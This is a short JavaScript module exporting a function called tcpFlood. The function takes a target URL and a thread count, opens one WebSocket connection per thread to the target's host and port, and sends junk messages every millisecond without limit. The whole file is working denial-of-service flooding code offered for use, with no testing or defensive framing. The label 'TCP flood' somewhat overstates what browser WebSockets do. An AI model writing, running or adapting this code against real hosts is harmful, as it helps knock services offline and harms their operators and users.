function tcpFlood(target, threads) {
  if (!target) {
    console.error("Target URL is required for TCP flood.");
    return;
  }

  threads = threads && threads > 0 ? threads : 1;

  try {
    let url;
    try {
      url = new URL(target);
    } catch (e) {
      console.error("Invalid URL:", target);
      return;
    }
    const hostname = url.hostname;
    const port = url.port || (url.protocol === 'https:' ? 443 : 80);

    for (let i = 0; i < threads; i++) {
      try {
        const socket = new WebSocket(`ws://${hostname}:${port}`);

        socket.onopen = () => {
          let counter = 0;
          setInterval(() => {
            try {
              const payload = `TCP Flood: Junk data ${counter++}`;
              socket.send(payload);
            } catch (e) {
              console.error("Error sending data:", e);
              socket.close();
            }
          }, 1);
        };

        socket.onerror = (error) => {
          console.error("WebSocket error:", error);
          socket.close();
        };

        socket.onclose = () => {
          console.log("WebSocket connection closed.");
        };
      } catch (socketError) {
        console.error("Error creating WebSocket:", socketError);
      }
    }
  } catch (e) {
    console.error("Error:", e);
  }
}

export { tcpFlood };